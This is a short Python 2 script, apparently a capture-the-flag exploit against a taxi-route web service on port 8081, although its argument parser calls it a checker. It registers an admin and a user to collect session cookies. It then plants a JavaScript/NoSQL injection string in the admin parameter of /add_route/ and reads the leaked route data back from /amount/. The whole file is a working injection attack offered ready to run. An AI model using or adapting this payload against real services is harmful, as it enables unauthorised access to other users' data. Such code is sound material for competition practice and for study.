#!/usr/bin/python
import requests
import random
import string
import argparse
import json


port = 8081


def gen_admin_name():
    res = ''.join(random.choice(string.ascii_lowercase) for i in range(random.randrange(3, 12)))
    res += ''.join(random.choice(string.digits) for i in range(random.randrange(2, 6)))
    return res


def gen_user_name():
    res = ''.join(random.choice(string.ascii_lowercase) for i in range(random.randrange(3, 12)))
    res = random.choice(string.ascii_uppercase) + res
    return res


def register_admin(hostname):
    admin = gen_admin_name()
    payload = ({'admin': admin})
    r = requests.post("http://%s:%s/add_admin/" % (hostname, str(port)), params = payload)
    if r.status_code == 200:
        if 'hm' in r.cookies:
            return admin, r.cookies['hm']
    return "", ""


def register_user(hostname, admin):
    user = gen_user_name()
    payload = ({'admin': admin, 'user': user})
    r = requests.post("http://%s:%s/add_user/" % (hostname, str(port)), params = payload)
    if r.status_code == 200:
        if 'hm' in r.cookies:
            return user, r.cookies['hm']
    return "", ""


def hack(hostname):
    admin, h_mac = register_admin(hostname)
    user, h_mac = register_user(hostname, admin)

    cookies = dict(hm=h_mac)
    admin += "'|| true) emit(this.route, this.route);if(false || '"

    payload = ({'id': id,  'amount': 500, 'admin': admin, 'user': 'user', 'route': 'route2'})
    r = requests.post("http://%s:%s/add_route/" % (hostname, port), params=payload, cookies=cookies)
    print r.url + "; " + str(r.status_code) + "; " + r.text

    payload = ({'admin': admin, 'user': user})
    r = requests.get("http://%s:%s/amount/" % (hostname, port), params=payload, cookies=cookies)
    print r.url + "; " + str(r.status_code) + "; " + r.text
    if r.status_code == 200:
        res = json.loads(r.text)
        print res


parser = argparse.ArgumentParser(description='taxi srv checker')
parser.add_argument(dest='hostname', action='store')
args = parser.parse_args()

hack(args.hostname)